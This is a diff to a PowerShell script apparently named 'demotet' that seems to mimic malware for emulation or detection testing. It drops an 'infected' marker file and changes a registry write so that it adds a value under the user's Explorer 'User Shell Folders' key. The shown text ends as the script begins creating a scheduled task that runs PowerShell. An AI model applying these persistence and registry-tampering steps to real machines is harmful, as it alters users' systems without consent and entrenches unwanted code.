@@ -1,9 +1,9 @@
 New-Item C:\Users\IEUser\AppData\Roaming\demotet\infected.txt
 Set-Content C:\Users\IEUser\AppData\Roaming\demotet\infected.txt 'You have been Infected!'
 
-$registryPath = "HKCU:\Software\Demotet\Scripts"
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
 $Name = "D7AD9WD56DQS89DW7DSAHDUQAI"
-$value = "1"
+$value = "%USERPROFILE%\AppData\Local\DKL432BHVYUVTYF643KHJK"
 
 IF(!(Test-Path $registryPath))
 
@@ -13,13 +13,13 @@ IF(!(Test-Path $registryPath))
 
     New-ItemProperty -Path $registryPath -Name $name -Value $value `
 
-    -PropertyType DWORD -Force | Out-Null}
+    -PropertyType REG_EXPAND_SZ -Force | Out-Null}
 
  ELSE {
 
     New-ItemProperty -Path $registryPath -Name $name -Value $value `
 
-    -PropertyType DWORD -Force | Out-Null}
+    -PropertyType  REG_EXPAND_SZ -Force | Out-Null}
     
     
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
